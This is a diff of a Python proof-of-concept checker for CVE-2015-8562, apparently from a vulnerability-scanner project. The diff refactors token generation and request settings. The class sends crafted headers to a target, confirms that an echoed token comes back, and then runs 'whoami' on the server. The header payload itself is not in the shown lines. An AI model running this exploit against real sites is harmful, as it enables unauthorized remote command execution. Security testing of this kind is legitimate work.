@@ -6,19 +6,14 @@ description: CVE-2015-8562漏洞可任意执行命令
 '''
 
 import re
-import string
-import random
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2015_8562_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.echo_commnd = 'echo ' + self.capta
         self.command = 'whoami'
         self.check_headers = {
@@ -33,14 +28,14 @@ class CVE_2015_8562_BaseVerify:
             self.url = "http://" + self.url
         try:
             check_s = requests.session()
-            check_response = check_s.get(self.url,headers = self.check_headers, allow_redirects = False, verify=False)
+            check_response = check_s.get(self.url,headers = self.check_headers)
             check_response = check_s.get(self.url)
             echo_info = check_response.text
             echo_result = re.findall(r'</html>(.*)',echo_info,re.S|re.I) 
             if self.capta in echo_result[0]:
                 print('存在CVE-2015-8562漏洞')
                 cmd_s = requests.session()
-                cmd_response = cmd_s.get(self.url,headers = self.check_headers, allow_redirects = False, verify=False)
+                cmd_response = cmd_s.get(self.url,headers = self.check_headers)
                 cmd_response = cmd_s.get(self.url)
                 cmd_info = cmd_response.text
                 cmd_result = re.findall(r'</html>(.*)',cmd_info,re.S|re.I)
